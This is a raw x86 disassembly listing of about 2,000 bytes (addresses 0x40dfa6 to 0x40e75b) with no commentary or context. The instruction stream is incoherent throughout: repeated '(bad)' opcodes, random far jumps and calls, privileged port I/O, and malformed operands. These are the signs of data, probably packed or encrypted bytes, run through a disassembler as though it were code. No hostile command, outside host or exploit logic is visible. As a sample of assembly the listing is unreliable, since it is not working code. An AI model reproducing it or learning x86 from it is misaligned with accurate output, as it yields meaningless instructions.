  40dfa6:	xor    DWORD PTR ds:[edi+0x34a606f2],esp
  40dfad:	jmp    0x40df38
  40dfaf:	cmp    ecx,DWORD PTR [edx+0x67]
  40dfb2:	dec    ebx
  40dfb3:	das    
  40dfb4:	fmul   DWORD PTR [ebx]
  40dfb6:	xchg   edx,eax
  40dfb7:	(bad)  
  40dfb8:	cmp    dh,BYTE PTR [edx+0x76b93015]
  40dfbe:	mov    BYTE PTR [ecx-0x3b2cd2b2],bl
  40dfc4:	sub    eax,DWORD PTR [edi-0x73a16abd]
  40dfca:	mov    ds:0x2f2a4340,eax
  40dfcf:	mov    esi,DWORD PTR [ebx-0x53]
  40dfd2:	es push esp
  40dfd4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dfd5:	sbb    al,0x98
  40dfd7:	pop    edx
  40dfd8:	rcl    BYTE PTR [ecx+0x55f6ac9e],1
  40dfde:	test   al,0x89
  40dfe0:	sub    DWORD PTR ds:0x85ad7afe,ecx
  40dfe6:	jno    0x40dfbe
  40dfe8:	inc    edx
  40dfe9:	sahf   
  40dfea:	test   esi,ecx
  40dfec:	lods   eax,DWORD PTR ds:[esi]
  40dfed:	dec    edi
  40dfee:	dec    edx
  40dfef:	fist   WORD PTR [ebx+0x31]
  40dff2:	sbb    al,bl
  40dff4:	aam    0x2d
  40dff6:	adc    eax,0xe0b049c9
  40dffb:	xchg   esp,esi
  40dffd:	ss out dx,eax
  40dfff:	push   ebp
  40e000:	dec    esp
  40e001:	mov    DWORD PTR [edi-0x2336893f],edx
  40e007:	mov    dh,0x54
  40e009:	push   0x34faa724
  40e00e:	retf   
  40e00f:	and    BYTE PTR [edi-0x5668a54d],ah
  40e015:	mov    al,BYTE PTR [ebp-0x3a]
  40e018:	add    eax,0x6df699ba
  40e01d:	stos   DWORD PTR es:[edi],eax
  40e01e:	add    BYTE PTR cs:[ecx+0x2ef3cca8],0x42
  40e026:	mov    cl,0x56
  40e028:	daa    
  40e029:	daa    
  40e02a:	jle    0x40e005
  40e02c:	xor    al,0x2f
  40e02e:	call   0xf210:0x74e17faa
  40e035:	lds    esi,FWORD PTR [edx]
  40e037:	clc    
  40e038:	test   al,0x8d
  40e03a:	add    dl,BYTE PTR [eax]
  40e03c:	mov    DWORD PTR [ebx+0x2f],edx
  40e03f:	jne    0x40e024
  40e041:	into   
  40e042:	mov    eax,ds:0x4294516f
  40e047:	popf   
  40e048:	jle    0x40dfd7
  40e04a:	mov    WORD PTR [edx+eax*2-0x5a2de857],ss
  40e051:	mov    WORD PTR [ecx-0x30],?
  40e054:	pusha  
  40e055:	ret    
  40e056:	outs   dx,BYTE PTR ds:[esi]
  40e057:	mov    eax,0x8deb9cd6
  40e05c:	mov    dh,0x0
  40e05e:	adc    ch,BYTE PTR [eax+0x7]
  40e061:	pop    ds
  40e062:	adc    eax,0x3ca27331
  40e067:	mov    ch,0x37
  40e069:	rol    DWORD PTR [ebx+0x4f],0xae
  40e06d:	inc    ebp
  40e06e:	push   ds
  40e06f:	cdq    
  40e070:	jge    0x40e0a1
  40e072:	mov    WORD PTR [edx],cs
  40e074:	dec    eax
  40e075:	aaa    
  40e076:	push   edi
  40e077:	cmp    al,0x83
  40e079:	dec    ebp
  40e07a:	aas    
  40e07b:	jb     0x40e067
  40e07d:	push   0x7d4f0216
  40e082:	fdivr  QWORD PTR [eax-0x54]
  40e085:	add    esp,DWORD PTR es:[esi+0x2a9a304f]
  40e08c:	dec    esi
  40e08d:	push   ebp
  40e08e:	cli    
  40e08f:	out    dx,al
  40e090:	(bad)  
  40e091:	aam    0x2b
  40e093:	bound  esp,QWORD PTR [eax+eiz*8+0x20fc27cd]
  40e09a:	test   eax,0x2967acd8
  40e09f:	xor    bh,BYTE PTR [eax-0x72f37948]
  40e0a5:	mov    ecx,DWORD PTR [edi]
  40e0a7:	je     0x40e02c
  40e0a9:	dec    eax
  40e0aa:	stos   DWORD PTR es:[edi],eax
  40e0ab:	sbb    BYTE PTR [ebp+0x49],dh
  40e0ae:	test   DWORD PTR [edx-0x9],esi
  40e0b1:	aaa    
  40e0b2:	mov    dh,ah
  40e0b4:	out    0x6a,eax
  40e0b6:	add    BYTE PTR [ebp-0x34599765],al
  40e0bc:	mov    DWORD PTR [esi+eax*1],edx
  40e0bf:	fwait
  40e0c0:	rcr    BYTE PTR [ebx],0xcc
  40e0c3:	popa   
  40e0c4:	sub    ch,BYTE PTR [esi+0x5]
  40e0c7:	bound  ebp,QWORD PTR [ebx]
  40e0c9:	pop    ecx
  40e0ca:	dec    edx
  40e0cb:	mov    ds:0x3ae9c377,eax
  40e0d0:	loopne 0x40e076
  40e0d2:	(bad)  
  40e0d3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e0d4:	pop    ebp
  40e0d5:	jo     0x40e0d4
  40e0d7:	dec    ecx
  40e0d8:	sbb    al,0x23
  40e0da:	mov    ds:0x212161d3,al
  40e0df:	int3   
  40e0e0:	add    ebx,0xfffffffc
  40e0e3:	and    DWORD PTR [ecx],ebx
  40e0e5:	mov    cl,0x8c
  40e0e7:	dec    ebx
  40e0e8:	sti    
  40e0e9:	cmp    eax,DWORD PTR [edi]
  40e0eb:	xchg   edx,eax
  40e0ec:	out    0x85,eax
  40e0ee:	dec    ebx
  40e0ef:	push   0xe466f28a
  40e0f4:	jno    0x40e112
  40e0f6:	dec    eax
  40e0f7:	pop    edx
  40e0f8:	jmp    0x40e0cf
  40e0fa:	retf   0xe09e
  40e0fd:	fsubp  st(5),st
  40e0ff:	lds    ecx,FWORD PTR [esi-0x54]
  40e102:	mov    DWORD PTR [ebx+0x49],edx
  40e105:	test   dh,ch
  40e107:	mov    ebp,0x70e025a3
  40e10c:	cmp    dh,BYTE PTR ds:[eax-0x4c]
  40e110:	inc    esp
  40e111:	jb     0x40e097
  40e113:	adc    al,0x2c
  40e115:	push   es
  40e116:	leave  
  40e117:	dec    ecx
  40e118:	cmp    eax,0xbe563036
  40e11d:	push   fs
  40e11f:	push   esi
  40e120:	mov    ebp,0x6142e7b8
  40e125:	ins    BYTE PTR es:[edi],dx
  40e126:	inc    edx
  40e127:	lods   al,BYTE PTR ds:[esi]
  40e128:	call   0x9844:0x86e42b23
  40e12f:	sub    al,0x98
  40e131:	pop    eax
  40e132:	adc    ch,BYTE PTR [eax]
  40e134:	mov    ds:0x9bbf3e91,al
  40e139:	sub    DWORD PTR [esi-0x2d],ebp
  40e13c:	(bad)  
  40e13d:	ror    ah,1
  40e13f:	sbb    eax,0x363ca7f0
  40e144:	pop    ebx
  40e145:	sbb    eax,0x6acfc73f
  40e14a:	mov    ebp,0x4a95d82a
  40e14f:	xor    ecx,DWORD PTR [ecx-0x67]
  40e152:	daa    
  40e153:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e154:	test   DWORD PTR [ebx],ebx
  40e156:	sub    BYTE PTR [edi+eiz*1],bl
  40e159:	mov    esi,0x575a6fa2
  40e15e:	sar    BYTE PTR [edx-0x521b4fe6],cl
  40e164:	adc    edi,DWORD PTR [eax+0x2ec93ab]
  40e16a:	mov    bh,0xa
  40e16c:	push   0x3e9dd338
  40e171:	pop    ss
  40e172:	outs   dx,BYTE PTR ds:[esi]
  40e173:	inc    esp
  40e174:	jae    0x40e13c
  40e176:	cmc    
  40e177:	sub    eax,0xa70f1158
  40e17c:	cmp    ecx,DWORD PTR [eax-0x48f5e1]
  40e182:	pop    ebp
  40e183:	mov    WORD PTR [ebx+0x2a02017a],?
  40e189:	inc    edi
  40e18a:	xchg   BYTE PTR [edi+0x4e],dh
  40e18d:	pop    eax
  40e18e:	jmp    0x40e165
  40e190:	jmp    0x78c5:0xe0e7c931
  40e197:	sub    DWORD PTR [edi+0x1855ac8],0x68
  40e19e:	dec    esi
  40e19f:	jnp    0x40e1e1
  40e1a1:	stos   BYTE PTR es:[edi],al
  40e1a2:	test   BYTE PTR [ecx-0x2be2309a],bh
  40e1a8:	and    bh,al
  40e1aa:	mov    ss,WORD PTR [edx+0x569f6b5b]
  40e1b0:	arpl   bx,bx
  40e1b2:	cmp    DWORD PTR [esi-0x7367a369],esi
  40e1b8:	pusha  
  40e1b9:	push   0x45
  40e1bb:	push   ds
  40e1bc:	cmp    eax,0x80b212c7
  40e1c1:	jbe    0x40e17e
  40e1c3:	lods   al,BYTE PTR ds:[esi]
  40e1c4:	in     al,dx
  40e1c5:	inc    eax
  40e1c6:	xor    eax,0x28d57635
  40e1cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e1cc:	aam    0xf9
  40e1ce:	dec    ecx
  40e1cf:	and    BYTE PTR [eax+eax*2],bh
  40e1d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e1d3:	test   al,0x1d
  40e1d5:	popa   
  40e1d6:	mov    DWORD PTR [ecx],edi
  40e1d8:	pop    ss
  40e1d9:	inc    edx
  40e1da:	loope  0x40e1fd
  40e1dc:	sahf   
  40e1dd:	stc    
  40e1de:	seta   BYTE PTR [edi-0x5f17241f]
  40e1e5:	jo     0x40e1dd
  40e1e7:	mov    ah,0x9b
  40e1e9:	rol    BYTE PTR [ebp-0x57],0xa5
  40e1ed:	mov    bh,0xae
  40e1ef:	(bad)  
  40e1f0:	jb     0x40e268
  40e1f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e1f3:	jmp    0x40e200
  40e1f5:	lods   al,BYTE PTR cs:[esi]
  40e1f7:	mov    eax,0xe2b7e685
  40e1fc:	or     bl,BYTE PTR [ecx]
  40e1fe:	mov    WORD PTR [edi],es
  40e200:	leave  
  40e201:	push   DWORD PTR [ecx]
  40e203:	in     al,0xc0
  40e205:	cli    
  40e206:	push   esi
  40e207:	rcr    DWORD PTR [ecx-0x2b47e7c0],0x73
  40e20e:	daa    
  40e20f:	ss xchg edi,eax
  40e211:	jmp    0xbcd4:0xc68f36b8
  40e218:	adc    cl,BYTE PTR ds:0xf7f73266
  40e21e:	mov    WORD PTR [esi+0x2c68f6b3],fs
  40e224:	or     ch,bh
  40e226:	mov    eax,0x14ac43c6
  40e22b:	xor    al,0xab
  40e22d:	ficom  DWORD PTR [edi]
  40e22f:	ins    BYTE PTR es:[edi],dx
  40e230:	aad    0x26
  40e232:	xchg   ecx,eax
  40e233:	ins    BYTE PTR es:[edi],dx
  40e234:	ror    dh,1
  40e236:	mov    bl,0xf
  40e238:	adc    eax,0xa2265dd7
  40e23d:	gs xchg ecx,eax
  40e23f:	sub    eax,DWORD PTR [ebx]
  40e241:	stc    
  40e242:	shr    ch,0x86
  40e245:	and    eax,0xed0e6e62
  40e24a:	mov    eax,0x61a30ad7
  40e24f:	test   BYTE PTR [eax-0x236c101f],0xa0
  40e256:	pop    es
  40e257:	jne    0x40e25b
  40e259:	pop    edx
  40e25a:	rcl    dl,cl
  40e25c:	sub    dl,bl
  40e25e:	or     bl,dh
  40e260:	test   BYTE PTR [esi-0x177eb046],0x7b
  40e267:	popa   
  40e268:	push   esi
  40e269:	jp     0x40e2ce
  40e26b:	and    al,0xa7
  40e26d:	mov    cs,edx
  40e26f:	inc    BYTE PTR [ecx+eiz*2+0x7b7e7f46]
  40e276:	xor    eax,0xd189d25
  40e27b:	mov    dl,dh
  40e27d:	mov    edi,0x20b72476
  40e282:	test   eax,0xb2caa20f
  40e287:	mov    DWORD PTR [esi+0x7e],0x3282b31a
  40e28e:	inc    esi
  40e28f:	loope  0x40e230
  40e291:	mov    ebp,0x7f32bdf0
  40e296:	and    esi,edi
  40e298:	popf   
  40e299:	sbb    al,0xae
  40e29b:	cwde   
  40e29c:	xchg   ebp,eax
  40e29d:	add    esi,DWORD PTR [ecx-0x28e53124]
  40e2a3:	mov    dl,0xd9
  40e2a5:	or     eax,0xd386101
  40e2aa:	push   esi
  40e2ab:	pop    ds
  40e2ac:	sbb    al,0xe0
  40e2ae:	mov    ah,0x28
  40e2b0:	dec    ebp
  40e2b1:	mov    si,0x7432
  40e2b5:	sti    
  40e2b6:	sub    al,0xd5
  40e2b8:	push   ss
  40e2b9:	pop    ss
  40e2ba:	in     al,dx
  40e2bb:	or     DWORD PTR ds:0xcaa000c9,eax
  40e2c1:	sbb    ah,BYTE PTR [ebp+0x43]
  40e2c4:	mov    ebx,tr1
  40e2c7:	je     0x40e274
  40e2c9:	inc    ecx
  40e2ca:	or     eax,0xede59090
  40e2cf:	jp     0x40e2dc
  40e2d1:	clc    
  40e2d2:	dec    edx
  40e2d3:	enter  0x5402,0x1
  40e2d7:	jecxz  0x40e303
  40e2d9:	cdq    
  40e2da:	out    dx,eax
  40e2db:	cs ds inc ebp
  40e2de:	out    dx,eax
  40e2df:	mov    al,0xc1
  40e2e1:	mov    bl,0x3a
  40e2e3:	in     al,dx
  40e2e4:	pop    es
  40e2e5:	jmp    0x4ea7:0x7d2b9fe9
  40e2ec:	inc    esp
  40e2ed:	sub    edi,DWORD PTR [edx+0x72]
  40e2f0:	sub    BYTE PTR ds:0x85f524ab,0x73
  40e2f7:	pusha  
  40e2f8:	and    ebx,DWORD PTR [ebp-0xb392d86]
  40e2fe:	add    BYTE PTR [esi-0x43],bh
  40e301:	xchg   edi,eax
  40e302:	mov    ds:0x5fa3b0fb,eax
  40e307:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e308:	stos   BYTE PTR es:[edi],al
  40e309:	imul   edx,DWORD PTR [esi+0x77339813],0x11ca30e4
  40e313:	push   eax
  40e314:	(bad)  
  40e316:	and    esi,edx
  40e318:	scas   al,BYTE PTR es:[edi]
  40e319:	pop    esp
  40e31a:	(bad)  
  40e31c:	mov    BYTE PTR [edx+0x4f8ce0eb],cl
  40e322:	inc    edi
  40e323:	popa   
  40e324:	scas   eax,DWORD PTR es:[edi]
  40e325:	imul   edx,DWORD PTR [esi],0x53
  40e328:	jle    0x40e362
  40e32a:	push   ebp
  40e32b:	ja     0x40e346
  40e32d:	push   esi
  40e32e:	and    ah,BYTE PTR [edx+0x329e372b]
  40e334:	arpl   WORD PTR [esi+0x3e],cx
  40e337:	mov    ebp,0x3b33d6e7
  40e33c:	mov    edi,0x5188ab21
  40e341:	adc    al,0xb6
  40e343:	jbe    0x40e369
  40e345:	lahf   
  40e346:	mov    cl,0x13
  40e348:	in     eax,dx
  40e349:	pop    esi
  40e34a:	cmp    eax,0x653ac524
  40e34f:	lock test DWORD PTR [edx-0x2e14a154],ebx
  40e356:	outs   dx,DWORD PTR ds:[esi]
  40e357:	pop    esi
  40e358:	adc    eax,eax
  40e35a:	outs   dx,DWORD PTR ds:[esi]
  40e35b:	add    ah,BYTE PTR [edi+0x52]
  40e35e:	xchg   esi,eax
  40e35f:	clc    
  40e360:	ins    BYTE PTR es:[edi],dx
  40e361:	in     al,dx
  40e362:	mov    ebx,DWORD PTR [esi]
  40e364:	push   ss
  40e365:	in     eax,dx
  40e366:	out    0xb7,al
  40e368:	xchg   esi,eax
  40e369:	xor    ch,BYTE PTR [ebp+0x2342d382]
  40e36f:	fldenv [ebx+0x5a]
  40e372:	push   edi
  40e373:	push   ebp
  40e374:	sbb    eax,0x40989527
  40e379:	pop    edx
  40e37a:	or     BYTE PTR [esi-0x27],dh
  40e37d:	aad    0xb
  40e37f:	mov    bl,0x4c
  40e381:	mov    ecx,0x73572737
  40e386:	sub    DWORD PTR [edi-0xb508b39],edx
  40e38c:	add    DWORD PTR [edi+0x7819d0b5],esi
  40e392:	retf   0xbcba
  40e395:	push   ebp
  40e396:	push   edx
  40e397:	cmp    ah,BYTE PTR [esi+0xa5249a]
  40e39d:	and    al,0xb2
  40e39f:	rol    BYTE PTR [ebx+ebx*4+0x38],cl
  40e3a3:	ins    DWORD PTR es:[edi],dx
  40e3a4:	popf   
  40e3a5:	clc    
  40e3a6:	jns    0x40e383
  40e3a8:	clc    
  40e3a9:	sbb    al,0xf2
  40e3ab:	mov    dh,0x93
  40e3ad:	mov    dh,0xaa
  40e3af:	loop   0x40e3c2
  40e3b1:	loopne 0x40e37d
  40e3b3:	scas   eax,DWORD PTR es:[edi]
  40e3b4:	xchg   edx,eax
  40e3b5:	shr    BYTE PTR ds:0xad1801b2,1
  40e3bb:	ss pop ecx
  40e3bd:	ins    DWORD PTR es:[edi],dx
  40e3be:	leave  
  40e3bf:	imul   DWORD PTR ds:0xefbdc962
  40e3c5:	and    al,0x36
  40e3c7:	xchg   edx,eax
  40e3c8:	scas   eax,DWORD PTR es:[edi]
  40e3c9:	inc    esi
  40e3ca:	mov    bl,0xed
  40e3cc:	jge    0x40e430
  40e3ce:	pop    es
  40e3cf:	pop    ss
  40e3d0:	cs dec edi
  40e3d2:	jg     0x40e42c
  40e3d4:	and    DWORD PTR [ecx],edx
  40e3d6:	pusha  
  40e3d7:	sub    BYTE PTR [eax],bh
  40e3d9:	jbe    0x40e371
  40e3db:	cli    
  40e3dc:	xchg   DWORD PTR [ecx],ebx
  40e3de:	inc    edx
  40e3df:	rcr    DWORD PTR [edx+0x31],1
  40e3e2:	test   BYTE PTR [ebx+0x30d5a59],dl
  40e3e8:	pop    ss
  40e3e9:	ret    
  40e3ea:	imul   BYTE PTR [ebp+0x2111075]
  40e3f0:	fild   QWORD PTR [ecx-0x390ecd37]
  40e3f6:	jnp    0x40e3bd
  40e3f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e3f9:	dec    edx
  40e3fa:	push   es
  40e3fb:	cmp    eax,ecx
  40e3fd:	test   eax,0xaefa92f5
  40e402:	sbb    ch,BYTE PTR ds:0xb95edb05
  40e408:	inc    edx
  40e409:	mov    eax,0x26ef4942
  40e40e:	loop   0x40e3bd
  40e410:	(bad)  
  40e411:	jno    0x40e44d
  40e413:	test   eax,0x333332c
  40e418:	fdiv   QWORD PTR [ecx-0x1aa2e621]
  40e41e:	in     al,0xe9
  40e420:	add    edx,DWORD PTR [bx]
  40e423:	retf   
  40e424:	jo     0x40e3c5
  40e426:	sbb    eax,0xf6a2a4ef
  40e42b:	(bad)  [eax+0x328dbf45]
  40e431:	xchg   ebp,eax
  40e432:	imul   edi,DWORD PTR [eax+0x57596680],0xffffffd5
  40e439:	mov    esi,0x524b03fe
  40e43e:	das    
  40e43f:	std    
  40e440:	jns    0x40e3c3
  40e442:	mov    ds:0x6c7869ba,al
  40e447:	pop    ss
  40e448:	xchg   DWORD PTR ds:[ecx],eax
  40e44b:	mov    ch,BYTE PTR [ebx-0xe16e8be]
  40e451:	arpl   WORD PTR [ecx+ebp*8-0x70826e09],sp
  40e458:	mov    ds:0xd0ad6eb,eax
  40e45d:	pop    ebx
  40e45e:	or     eax,DWORD PTR [edi-0x147d812a]
  40e464:	jb     0x40e411
  40e466:	ret    0x929b
  40e469:	xlat   BYTE PTR ds:[ebx]
  40e46a:	xor    esi,DWORD PTR [esi+0x2f]
  40e46d:	mov    bh,0x3e
  40e46f:	test   DWORD PTR [ebx+esi*2-0x5b31a91d],0x86b359de
  40e47a:	out    0x28,al
  40e47c:	adc    BYTE PTR [edx],bl
  40e47e:	xor    ebp,DWORD PTR [ecx+ebx*2+0x1b4a80ad]
  40e485:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e487:	add    esp,DWORD PTR [esi]
  40e489:	sbb    dl,0x5a
  40e48c:	loop   0x40e4d7
  40e48e:	pop    edx
  40e48f:	sub    eax,0x52c1632f
  40e494:	xchg   edx,eax
  40e495:	cdq    
  40e496:	adc    DWORD PTR [eax+0x192acde0],ecx
  40e49c:	jns    0x40e421
  40e49e:	fxam   
  40e4a0:	push   edx
  40e4a1:	sbb    ebp,DWORD PTR [ebp+ebp*2-0x6c5a52f3]
  40e4a8:	add    bl,BYTE PTR [ebx-0x5b10c1cb]
  40e4ae:	hlt    
  40e4af:	and    eax,0x6e1a2989
  40e4b4:	jne    0x40e47f
  40e4b6:	mov    edx,edx
  40e4b8:	imul   eax,esi,0x2e86b84e
  40e4be:	scas   al,BYTE PTR es:[edi]
  40e4bf:	dec    eax
  40e4c0:	mov    ds:0x46a8ecfc,eax
  40e4c5:	les    eax,FWORD PTR [edi+0x32]
  40e4c8:	jae    0x40e47f
  40e4ca:	jecxz  0x40e478
  40e4cc:	adc    BYTE PTR [eax],ah
  40e4ce:	pop    ebx
  40e4cf:	mov    cs,WORD PTR [ebx+0x1d7dd1]
  40e4d5:	ins    BYTE PTR es:[edi],dx
  40e4d6:	cli    
  40e4d7:	pop    ebx
  40e4d8:	push   es
  40e4d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e4da:	cs xchg edx,eax
  40e4dc:	mov    edx,0xef4b1e8e
  40e4e1:	outs   dx,DWORD PTR ds:[esi]
  40e4e2:	into   
  40e4e3:	aaa    
  40e4e4:	sbb    DWORD PTR [ebx],eax
  40e4e6:	push   0xffffff94
  40e4e8:	mov    esp,0x96240dad
  40e4ed:	jg     0x40e538
  40e4ef:	or     ebp,edi
  40e4f1:	cmc    
  40e4f2:	or     edx,ebp
  40e4f4:	dec    ecx
  40e4f5:	inc    ebp
  40e4f6:	add    DWORD PTR [esi],0x2b
  40e4f9:	rcr    BYTE PTR [ebp+0x18],cl
  40e4fc:	pop    ecx
  40e4fd:	dec    eax
  40e4fe:	pop    edx
  40e4ff:	popa   
  40e500:	mov    ds:0xcea4a194,eax
  40e505:	mov    ebx,0x152ad46a
  40e50a:	imul   ebp,DWORD PTR [ebp+0x0],0xfffffff4
  40e50e:	mov    edx,0xb231d3e9
  40e513:	adc    DWORD PTR [ebx-0x2d4dc4b],eax
  40e519:	or     eax,0x8afdd063
  40e51e:	sbb    eax,0x4e923446
  40e523:	mov    cl,0x5f
  40e525:	jne    0x40e512
  40e527:	les    ebx,FWORD PTR ds:0x82b4d83a
  40e52d:	fisttp QWORD PTR [eax]
  40e52f:	mov    cl,0xb9
  40e531:	pop    es
  40e532:	and    al,0xbf
  40e534:	mov    cl,0x51
  40e536:	jmp    0x40e4c3
  40e538:	and    eax,esp
  40e53a:	dec    edx
  40e53b:	mov    ebx,0x72bca6fb
  40e540:	shl    DWORD PTR [ebp-0x10987b1e],0x37
  40e547:	lods   al,BYTE PTR ds:[esi]
  40e548:	adc    eax,0xa613b612
  40e54d:	xchg   edi,eax
  40e54e:	inc    eax
  40e54f:	push   esi
  40e550:	loope  0x40e56f
  40e552:	or     al,0x8f
  40e554:	fadd   DWORD PTR [eax+0x23]
  40e557:	lock mov ebx,0xb6bb9323
  40e55d:	inc    ecx
  40e55e:	dec    esp
  40e55f:	mov    ah,0x6b
  40e561:	inc    ebp
  40e562:	fstp   QWORD PTR [ebx-0x48]
  40e565:	mov    al,ds:0x81c661c7
  40e56a:	mov    esp,ecx
  40e56c:	sbb    eax,0x3306828e
  40e571:	(bad)  
  40e572:	push   ebp
  40e573:	inc    esi
  40e574:	jb     0x40e55c
  40e576:	and    al,0x2d
  40e578:	mov    bl,0xf1
  40e57a:	shl    BYTE PTR [edi-0x24],cl
  40e57d:	aad    0xf6
  40e57f:	mov    esi,0xf6cc0792
  40e584:	gs dec ebp
  40e586:	scas   eax,DWORD PTR es:[edi]
  40e587:	hlt    
  40e588:	out    dx,al
  40e589:	mov    ecx,0xb8754ff0
  40e58e:	and    eax,0xe09db25d
  40e593:	dec    ebx
  40e594:	dec    esi
  40e595:	imul   esp,DWORD PTR [ebp-0x46a95c9d],0xffffffad
  40e59c:	jae    0x40e61a
  40e59e:	ret    0x7e77
  40e5a1:	out    0xd9,al
  40e5a3:	cmp    eax,0x44811d6f
  40e5a8:	lods   eax,DWORD PTR ds:[esi]
  40e5a9:	shl    BYTE PTR ds:0x869323fd,1
  40e5af:	out    dx,al
  40e5b0:	push   0xcfe55b6d
  40e5b5:	mul    cl
  40e5b7:	das    
  40e5b8:	adc    al,0xd8
  40e5ba:	pop    eax
  40e5bb:	adc    DWORD PTR [edx+0x791bc793],edi
  40e5c1:	call   0xb62c:0x2d07c703
  40e5c8:	es stc 
  40e5ca:	sahf   
  40e5cb:	adc    DWORD PTR [ebp-0x4a958fb6],edi
  40e5d1:	clc    
  40e5d2:	dec    edi
  40e5d3:	ins    BYTE PTR es:[edi],dx
  40e5d4:	jp     0x40e5c9
  40e5d6:	outs   dx,DWORD PTR ds:[esi]
  40e5d7:	frstor [esi]
  40e5d9:	ret    0xbc38
  40e5dc:	or     eax,0x75b78903
  40e5e1:	push   ds
  40e5e2:	mov    eax,ds:0x9510ca4c
  40e5e7:	(bad)  
  40e5e8:	into   
  40e5e9:	retf   0x1754
  40e5ec:	jnp    0x40e660
  40e5ee:	cwde   
  40e5ef:	mov    ebp,DWORD PTR [ebx-0x1a]
  40e5f2:	adc    ebp,0xf8d2c0d8
  40e5f8:	push   edi
  40e5f9:	cld    
  40e5fa:	mov    esp,0xcb7a03d0
  40e5ff:	and    DWORD PTR [ecx],ecx
  40e601:	nop
  40e602:	pop    edi
  40e603:	retf   
  40e604:	fs push edi
  40e606:	inc    BYTE PTR [edx-0x2d2e560d]
  40e60c:	and    eax,0xd50596e3
  40e611:	push   ecx
  40e612:	or     eax,0x4e165e1c
  40e617:	iret   
  40e618:	(bad)  
  40e619:	frstor [esp-0x54e497d0]
  40e620:	and    dl,BYTE PTR [ebp-0x158a9860]
  40e626:	daa    
  40e627:	mov    bh,0x9
  40e629:	mov    ds:0x9d699083,eax
  40e62e:	add    eax,0x35009c9a
  40e633:	adc    al,0xc2
  40e635:	lahf   
  40e636:	lods   eax,DWORD PTR ds:[esi]
  40e637:	or     eax,0x40426e7e
  40e63c:	mov    ds:0xb80535a5,al
  40e641:	push   esi
  40e642:	and    esi,DWORD PTR [eax-0x82dbe61]
  40e648:	inc    ebx
  40e649:	sub    al,0xba
  40e64b:	fwait
  40e64c:	xlat   BYTE PTR ds:[ebx]
  40e64d:	adc    DWORD PTR [esi],esp
  40e64f:	(bad)  [ebp+0x1b6e222c]
  40e655:	leave  
  40e656:	test   al,0x7b
  40e658:	pop    edx
  40e659:	test   al,0xa7
  40e65b:	pop    esi
  40e65c:	enter  0x574c,0xaa
  40e660:	retf   
  40e661:	cmp    DWORD PTR [eax+0xe11b413],0xffffffd4
  40e668:	sbb    eax,0x502fbf70
  40e66d:	sbb    DWORD PTR [ecx+0x72],0x5a29dbf3
  40e674:	sbb    eax,0xf76d34c8
  40e679:	mov    cl,0x60
  40e67b:	mov    edx,0x7a4cd5d7
  40e680:	mov    al,ds:0x96ca48f
  40e685:	or     esi,ecx
  40e687:	mov    esi,0x20ef5ce4
  40e68c:	sbb    bh,BYTE PTR [esi+0x76534d28]
  40e692:	jo     0x40e6cd
  40e694:	mov    esi,eax
  40e696:	push   0xffffffee
  40e698:	div    ebp
  40e69a:	call   0xef72:0xaa9cf82
  40e6a1:	pop    ebp
  40e6a2:	scas   al,BYTE PTR es:[edi]
  40e6a3:	jno    0x40e719
  40e6a5:	jecxz  0x40e629
  40e6a7:	mov    dl,0x5
  40e6a9:	adc    al,BYTE PTR [edi-0x51c2b29c]
  40e6af:	adc    esp,DWORD PTR [ebp-0x366d6ca6]
  40e6b5:	out    0xbb,eax
  40e6b7:	pushf  
  40e6b8:	jmp    0x40e67a
  40e6ba:	or     eax,0x3b94eabe
  40e6bf:	nop
  40e6c0:	jo     0x40e741
  40e6c2:	into   
  40e6c3:	inc    esi
  40e6c4:	lods   eax,DWORD PTR fs:[esi]
  40e6c6:	push   0x0
  40e6c8:	xor    DWORD PTR [edx-0x5],0x26
  40e6cc:	xchg   ecx,eax
  40e6cd:	pop    ebx
  40e6ce:	push   cs
  40e6cf:	sbb    BYTE PTR [edx+0x2d0d895f],cl
  40e6d5:	cmp    DWORD PTR [ebp+0x18],ebx
  40e6d8:	aas    
  40e6d9:	sub    al,0x31
  40e6db:	cdq    
  40e6dc:	fs push cs
  40e6de:	outs   dx,BYTE PTR ds:[esi]
  40e6df:	into   
  40e6e0:	jb     0x40e69e
  40e6e2:	outs   dx,BYTE PTR ds:[esi]
  40e6e3:	mov    dl,0x13
  40e6e5:	or     al,0xe3
  40e6e7:	mul    DWORD PTR [eax-0x2c]
  40e6ea:	cld    
  40e6eb:	xlat   BYTE PTR ds:[ebx]
  40e6ec:	or     BYTE PTR [ebp+0x1f],ch
  40e6ef:	mov    eax,0xe819f3e1
  40e6f4:	(bad)  
  40e6f5:	leave  
  40e6f6:	mov    DWORD PTR [eax+0x6],edx
  40e6f9:	jbe    0x40e689
  40e6fb:	mov    WORD PTR [edx+0x158a2208],es
  40e701:	ds and edx,DWORD PTR cs:[edi-0x75f2d92a]
  40e709:	aad    0x2d
  40e70b:	or     DWORD PTR [ecx+0x12],esp
  40e70e:	inc    esp
  40e70f:	fstp   DWORD PTR [ebp-0x9853a14]
  40e715:	xchg   ebp,eax
  40e716:	inc    eax
  40e717:	jmp    0xb8bb32d3
  40e71c:	jmp    0xf1e3d59b
  40e721:	and    esp,DWORD PTR [esi]
  40e723:	out    0x7c,eax
  40e725:	cdq    
  40e726:	sbb    ah,BYTE PTR [ebx]
  40e728:	pop    eax
  40e729:	jnp    0x40e77a
  40e72b:	frstor [esi]
  40e72d:	xchg   ebx,eax
  40e72e:	or     ch,BYTE PTR [ecx]
  40e730:	sbb    bl,BYTE PTR [edi+0x6fbe094a]
  40e736:	cmp    DWORD PTR [ebp+0x36],ecx
  40e739:	mov    ?,WORD PTR ds:0x69f224aa
  40e73f:	ret    
  40e740:	fidivr DWORD PTR [edx-0x795eafe1]
  40e746:	adc    esp,eax
  40e748:	std    
  40e749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e74a:	test   al,0x5c
  40e74c:	cs xchg ebp,eax
  40e74e:	adc    esp,DWORD PTR fs:[ecx+0x3a8dad84]
  40e755:	and    esi,ebx
  40e757:	test   edx,esp
  40e759:	jge    0x40e763
  40e75b:	into   
